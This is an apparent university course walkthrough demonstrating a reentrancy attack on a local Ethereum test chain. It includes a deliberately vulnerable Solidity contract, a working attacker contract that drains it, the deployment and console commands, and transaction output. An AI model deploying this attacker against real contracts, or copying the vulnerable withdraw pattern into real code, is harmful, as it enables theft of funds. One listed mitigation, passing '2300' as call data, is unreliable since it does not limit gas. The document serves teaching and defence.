## Spring 2020 Developing Blockchain Use Cases - Code Walkthrough
### Carnegie Mellon University

**Learning Objectives:** This code walkthrough will illustrate one type of attack - a reentrancy attack - that can be launched against an Ethereum smart contract. It
is based on the video found here:
https://www.youtube.com/watch?v=OUlNtHT17lA
and the document found here:
https://consensys.github.io/smart-contract-best-practices/known_attacks/

Starting in an empty directory:

```
  truffle init
  npm init
  npm install dotenv truffle-wallet-provider ethereumjs-wallet

```
Populate the contracts directory with three contracts:

Migrations.sol (already provided)
Attacker.sol  (controlled by Mallory)
Victim.sol (controlled by Alice)

The Solidity code for the victim (Victim.sol) is as follows:

```
pragma solidity ^0.5.0;

contract Victim {
     // Contract: If the user clears the balance we will pay them 1 eth.
     uint balance = 100;


     // pre: balance > 0

     function withdraw() public {
         require(balance > 0);
         uint transferAmt = 1 ether;
         // Call the sender's fallback function with 1 eth.
         // Note that we fail to specify how much gas is available within ().
         // So, all gas provided by the original caller is available to be consumed.
         // Contracts do not pay any gas fees in the current version of Ethereum.
         // The contract is paying its own eth to the sender.
         msg.sender.call.value(transferAmt)("");
         // clear the balance
         balance = 0;
     }
     // This contract has some eth provided by a caller
     function() payable external {

     }
}

```

The attacker code (Attacker.sol) is as follows:

```

pragma solidity ^0.5.0;

// Attacker.sol
// import ABI of Victim.sol
import './Victim.sol';

contract Attacker {
  uint counter = 0;
  Victim victim;

  event fallbackCalled(uint c, uint balance);

  // Construct this contract with the victim's address.
  constructor(address payable victimAddress) public {
     victim = Victim(victimAddress);

  }
  // Mallory calls attack and attack makes one withdraw.
  // Mallory gets 1 eth added to the eth account of this contract by
  // making this call.
  // But, the Victim's withdraw passes ether to Mallory's fallback function.
  // That function calls withdraw() again before the victim's
  // code clears the balance.
  function attack() public  {
    victim.withdraw();
  }

  // collects Ether for counter = 1..9.
  function() payable external {
    counter++;
    emit fallbackCalled(counter,msg.value);
    if(counter < 10) {
      victim.withdraw();
    }

  }

}


```

The migration code is placed in the migrations directory. This file
is named 2_deploy_contracts.js.

Note that it deploys two contracts, one after the other.
The address of the first is passed to the second.

```
var Attacker = artifacts.require('./Attacker.sol')
var Victim = artifacts.require('./Victim.sol')
module.exports = function(deployer) {
       deployer.deploy(Victim).then(function () {
           return deployer.deploy(Attacker, Victim.address)
    });
};


```

Run truffle migrate --reset
and then run truffle console and retrieve references to our two contracts.

```
truffle migrate --reset
truffle console

Victim.deployed().then(contract => victim = contract)
Attacker.deployed().then(contract => attacker = contract)

```

We need to send the victim some ETH. Get access to web3 and then send.

```

var Web3 = require('web3');
var web3 = new Web3(new Web3.providers.HttpProvider('http://127.0.0.1:7545'));
web3.isConnected();

Alice = web3.eth.accounts[0]
web3.eth.sendTransaction({from:Alice,to:victim.address,value:web3.toWei(11,'ether')})

```

Now, we launch the attack.

```
attacker.attack()

```

Check the balance of the attacker.

```
web3.eth.getBalance(attacker.address).toString()

```

'10000000000000000000'         10 ETH

Check the balance of the victim.

```
web3.eth.getBalance(victim.address).toString()

'1000000000000000000'             1 ETH

```

Preventing this attack:

1) Do the call as the final statement in the victim, after setting balance to 0.
2) Specify a small amount of gas in the msg.sender.call.value(transferAmt)("2300");
3) Use msg.sender.transfer(transferAmt); // also restricts gas and reverts on failure

See the receipt returned by the attack transaction

attacker.attack()
{ tx:
   '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
  receipt:
   { transactionHash:
      '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
     transactionIndex: 0,
     blockHash:
      '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
     blockNumber: 15,
     from: '0x565850dae3afd10151f68b78cd20b5e9d1d993ba',
     to: '0xa78b0404aa09c23c52f1f2950f0733674b6831e5',
     gasUsed: 238410,
     cumulativeGasUsed: 238410,
     contractAddress: null,
     logs:
      [ [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object] ],
     status: true,
     logsBloom:
      '0x00000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000020000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000',
     v: '0x1c',
     r:
      '0xa63377393d1ae62053de709fbef0b193d2e51374e17c316181906d33c12cb34b',
     s:
      '0x385627d1b5f79df94ed5dd3cd25509252c79ef1bfb8ec5986942ca95a0bcd0ea',
     rawLogs:
      [ [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object] ] },
  logs:
   [ { logIndex: 0,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_64e0ee7b',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 1,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_9a2e2f30',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 2,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_93f68db5',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 3,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_390de565',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 4,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_b88cd2eb',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 5,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_6660b0dd',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 6,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_32d98cf3',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 7,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_2ed42943',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 8,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_7cf81cf8',
       event: 'fallbackCalled',
       args: [Result] },
     { logIndex: 9,
       transactionIndex: 0,
       transactionHash:
        '0x56b26036db78aa7f17b64ea89f3be54067e7e928ef64300bca07ef95d2f15386',
       blockHash:
        '0x68d94fa72bf4bac0616296c61bfc4fe858d49d2f79ae135c8756a772533bdd70',
       blockNumber: 15,
       address: '0xA78b0404aA09c23C52f1f2950f0733674B6831e5',
       type: 'mined',
       id: 'log_6478ca38',
       event: 'fallbackCalled',
       args: [Result] } ] }
